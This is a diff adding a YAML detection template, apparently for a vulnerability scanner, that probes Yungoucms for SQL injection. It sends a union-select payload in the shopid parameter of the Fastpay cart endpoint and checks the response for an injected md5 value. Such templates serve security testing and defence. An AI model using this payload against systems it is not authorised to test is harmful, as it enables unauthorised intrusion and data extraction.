@@ -1,0 +1,22 @@
+id: poc-yaml-yungoucms-sqli
+info:
+  name: Yungoucms SQL注入漏洞
+  severity: medium
+  tags:
+  - sql-injection
+  finger: Yungoucms
+  reference: []
+  description: null
+variables:
+  rand: random_int(10000, 21000)
+transport: http
+requests:
+- method: GET
+  path: /?/member/cart/Fastpay&shopid=-1%20union%20select%20md5({{.rand}}),2,3,4%20--+
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, md5(rand))
+  output: []
